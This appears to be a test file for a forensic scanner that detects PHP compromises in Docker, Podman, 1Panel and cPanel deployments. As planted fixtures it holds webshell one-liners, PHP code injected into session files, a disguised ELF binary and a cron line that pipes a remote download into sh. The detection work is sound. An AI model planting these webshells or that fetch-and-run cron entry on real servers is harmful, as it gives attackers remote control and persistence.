"""Docker/Podman discovery: PHP running in containers (1Panel-style deployments)."""

import json

from php2shell_scanner import cli
from php2shell_scanner.containers import discover_containers
from php2shell_scanner.fs import RootFS

CID = "a" * 64
MOUNT_ID = "b" * 64
SITE = "/opt/1panel/apps/openresty/openresty/www/sites/example.com/index"


def build_docker(tree, data_root="/var/lib/docker", image="1panel/php:8.2.34-fpm"):
    config = {
        "Name": "/1Panel-php8-abcd",
        "Driver": "overlay2",
        "Config": {"Image": image},
        "State": {"Running": True},
        "MountPoints": {
            "/www": {"Source": SITE, "Destination": "/www", "Type": "bind"},
            "/var/log/php": {"Source": "/opt/1panel/runtime/php/php8/log",
                             "Destination": "/var/log/php", "Type": "bind"},
            "/data": {"Source": "", "Destination": "/data", "Type": "volume", "Name": "vol1"},
            "/var/run/docker.sock": {"Source": "/var/run/docker.sock",
                                     "Destination": "/var/run/docker.sock", "Type": "bind"},
        },
    }
    tree.write("{}/containers/{}/config.v2.json".format(data_root, CID), json.dumps(config))
    tree.write("{}/image/overlay2/layerdb/mounts/{}/mount-id".format(data_root, CID), MOUNT_ID)
    upper = "{}/overlay2/{}/diff".format(data_root, MOUNT_ID)
    tree.mkdir(upper + "/usr/local/etc/php")
    return upper


def test_docker_container_discovery(tree):
    upper = build_docker(tree)
    tree.mkdir(SITE)
    tree.mkdir("/var/lib/docker/volumes/vol1/_data")
    (container,) = discover_containers(RootFS(tree.root))
    assert container.name == "1Panel-php8-abcd" and container.web and container.running
    assert container.upper_dir == upper
    assert (SITE, "/www") in container.mounts
    assert ("/var/lib/docker/volumes/vol1/_data", "/data") in container.mounts


def test_custom_docker_data_root(tree):
    tree.write("/etc/docker/daemon.json", json.dumps({"data-root": "/data/docker"}))
    build_docker(tree, data_root="/data/docker")
    assert len(discover_containers(RootFS(tree.root))) == 1


def test_podman_discovery(tree):
    root = "/var/lib/containers/storage"
    tree.write(root + "/overlay-containers/containers.json", json.dumps([{
        "id": "c" * 64, "names": ["wp"], "layer": "d" * 64,
        "metadata": json.dumps({"image-name": "docker.io/library/wordpress:latest"})}]))
    tree.mkdir(root + "/overlay/" + "d" * 64 + "/diff")
    (container,) = discover_containers(RootFS(tree.root))
    assert container.name == "wp" and container.web


def test_compromise_inside_container_is_found(tree, tmp_path):
    upper = build_docker(tree)
    tree.write(SITE + "/uploads/avatar.php", "<?php @eval($_POST['x']);")
    tree.write(upper + "/tmp/sess_exploitab12cd34ef56ab78cd90",
               'upload_progress_x|a:1:{s:4:"name";s:20:"<?php system(\'id\');?>";}')
    tree.write(upper + "/tmp/.x/kworker", b"\x7fELF" + b"\x00" * 32, mode=0o755)
    tree.write(upper + "/var/spool/cron/crontabs/www-data", "* * * * * curl -s http://x/a | sh\n")
    log_line = ('203.0.113.66 - - [20/Oct/2026:13:22:02 +0000] "GET /x.php?f=/tmp/sess_'
                'exploitab12cd34ef56ab78cd90 HTTP/1.1" 200 98 "-" "python"\n')
    tree.write("/var/lib/docker/containers/{0}/{0}-json.log".format(CID),
               json.dumps({"log": log_line, "stream": "stdout"}) + "\n")
    out = str(tmp_path / "r.json")
    code = cli.main(["forensics", "--root", tree.root, "--no-exec", "-q", "--json", out,
                     "--no-markdown"])
    data = json.load(open(out))
    got = {(f["rule"], f["path"].split("/")[-1]) for f in data["findings"]}
    assert code == 3
    assert ("WEB-EVAL-INPUT", "avatar.php") in got
    assert ("SESS-PHP-CODE", "sess_exploitab12cd34ef56ab78cd90") in got
    assert ("TMP-ELF", "kworker") in got
    assert ("PERSIST-WEBUSER-CRON", "www-data") in got
    assert any(f["rule"] == "LOG-POC-SID" for f in data["findings"])
    assert data["discovery"]["containers"][0]["name"] == "1Panel-php8-abcd"


def test_upper_dir_from_mountinfo():
    from php2shell_scanner.containers import upper_from_mountinfo
    text = ("1 0 0:1 / /proc rw - proc proc rw\n"
            "2 1 0:45 / / rw,relatime - overlay overlay rw,lowerdir=/l1:/l2,"
            "upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/9/fs,"
            "workdir=/w\n")
    assert upper_from_mountinfo(text).endswith("snapshots/9/fs")
    assert upper_from_mountinfo("2 1 0:45 / / rw - overlay o rw,upperdir=/a\\040b,workdir=/w") \
        == "/a b"


def test_onepanel_custom_base_dir_and_app_sessions(tree, scan_env):
    tree.write("/usr/local/bin/1pctl", "#!/bin/bash\nBASE_DIR=/data/panel\nORIGINAL_PORT=10086\n")
    panel = "/data/panel/1panel"
    tree.write(panel + "/www/sites/shop/index/s.php", "<?php system($_GET['c']);")
    tree.write(panel + "/www/sites/shop/log/access.log",
               '1.2.3.4 - - [20/Oct/2026:13:22:01 +0000] "GET /x.php?f=/tmp/sess_abcdef123 '
               'HTTP/1.1" 200 1 "-" "x"\n')
    tree.write(panel + "/runtime/php/php83/conf/php.ini", "auto_prepend_file = /tmp/.x.php\n")
    tree.write(panel + "/apps/wordpress/blog/data/wp-includes/version.php", "<?php $wp_version='6.6';")
    tree.write("/var/www/html/tp/runtime/session/sess_abc123",
               'think|a:1:{s:4:"name";s:20:"<?php system(\'id\');?>";}')
    ctx, disc = scan_env()
    assert panel + "/www" in disc.webroots
    assert panel + "/apps/wordpress/blog/data" in disc.webroots
    assert any(p.endswith("sites/shop/log/access.log") for p in disc.log_files)
    assert panel + "/runtime/php/php83/conf/php.ini" in disc.php_ini_files
    assert "/var/www/html/tp/runtime/session" in disc.session_dirs
    from php2shell_scanner.checks import sessions
    hits = [f for f in sessions.run(ctx, disc) if f.rule == "SESS-PHP-CODE"]
    assert [f.path for f in hits] == ["/var/www/html/tp/runtime/session/sess_abc123"]


def test_cpanel_docroots(tree, scan_env):
    tree.write("/etc/userdatadomains",
               "shop.example.com: bob==root==main==shop.example.com==/home/bob/shop==1.2.3.4:80\n")
    tree.mkdir("/home/bob/shop")
    ctx, disc = scan_env()
    assert "/home/bob/shop" in disc.webroots


def test_containerized_uid_1000_is_web_but_host_uid_1000_is_not():
    from php2shell_scanner.checks import processes
    from test_system_checks import disc_with, proc
    in_container = proc(uid=1000, cmd="sh -c id")._replace(container=True)
    on_host = proc(uid=1000, cmd="bash")
    assert "PROC-WEBUSER-SHELL" in {f.rule for f in processes.check_process(in_container,
                                                                            disc_with())}
    assert processes.check_process(on_host, disc_with()) == []


def test_private_tmp_of_web_services_is_scanned(tree, scan_env):
    from php2shell_scanner.checks import tmp_artifacts
    tree.write("/tmp/systemd-private-1-php8.2-fpm.service-Ab/tmp/x.php", "<?php eval($_POST[1]);")
    tree.write("/tmp/systemd-private-1-chronyd.service-Cd/tmp/y.php", "<?php eval($_POST[1]);")
    ctx, disc = scan_env()
    paths = {f.path for f in tmp_artifacts.run(ctx, disc)}
    assert any("php8.2-fpm" in p for p in paths)
    assert not any("chronyd" in p for p in paths)
